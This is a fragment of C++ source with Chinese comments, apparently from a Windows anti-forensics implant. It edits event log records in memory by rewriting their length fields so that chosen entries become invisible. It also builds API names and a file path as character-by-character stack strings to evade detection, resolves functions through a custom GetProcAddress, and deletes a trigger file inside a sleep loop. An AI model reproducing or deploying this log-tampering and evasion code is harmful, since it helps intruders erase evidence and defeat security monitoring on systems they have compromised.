                        if (!_already_deleted && _event_id) {
                            // 等于指定eventid的日志不要
                            if (_EventRecordID > _event_id) {
                                _already_deleted = 1;
                                // 关于删除节点，我的想法就是把前一个节点的第一个len字段值_pre_len设置为_pre_len+_cur_len
                                // 把当前节点的最后一个len字段也设置为_pre_len+_cur_len，这样在遍历的时候就会忽略掉当前节点
                                if (0x2a2a0000 == *(reinterpret_cast<DWORD*>(_current_record - _len)) &&
                                    0x2a2a0000 == *(reinterpret_cast<DWORD*>(_current_record + _len))) {
                                    DWORD _pre_len = *(reinterpret_cast<DWORD*>(_current_record - _len + 4));
                                    // 修改前一个节点第一个len字段的值
                                    *reinterpret_cast<DWORD*>(_current_record - _len + 4) = _pre_len + _len;
                                    // 修改当前节点最后一个len字段的值
                                    *(reinterpret_cast<DWORD*>(_current_record + _len - 4)) = _pre_len + _len;
                                }
                            }
                        }

                        // 获取下一个节点的地址
                        _current_record = _current_record + _len;
                    }
                    break;
                }
            }

            SecureZeroMemory(stack_string, 50);
            stack_string[0] = 'D'; stack_string[1] = 'e'; stack_string[2] = 'l'; stack_string[3] = 'e'; stack_string[4] = 't'; stack_string[5] = 'e'; stack_string[6] = 'F'; stack_string[7] = 'i'; stack_string[8] = 'l'; stack_string[9] = 'e'; stack_string[10] = 'A';
            PNT_DeleteFileA NT_DeleteFileA = (PNT_DeleteFileA)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);

            
            SecureZeroMemory(stack_string, 50);
            stack_string[0] = 'C'; stack_string[1] = ':'; stack_string[2] = '\\'; stack_string[3] = 'u'; stack_string[4] = 's'; stack_string[5] = 'e'; stack_string[6] = 'r'; stack_string[7] = 's'; stack_string[8] = '\\'; stack_string[9] = 'p'; stack_string[10] = 'u'; stack_string[11] = 'b'; stack_string[12] = 'l'; stack_string[13] = 'i'; stack_string[14] = 'c'; stack_string[15] = '\\'; stack_string[16] = 'm'; stack_string[17] = 'i'; stack_string[18] = 'a'; stack_string[19] = 'l';
            // 处理完成后就删掉这个文件，避免重复操作
            // 如果有匹配到的，就删除文件，没有匹配到就不删除
            if(_got_matched)
            NT_DeleteFileA(stack_string);
        }
        NT_Sleep(2000);
    }
    return 0;
}
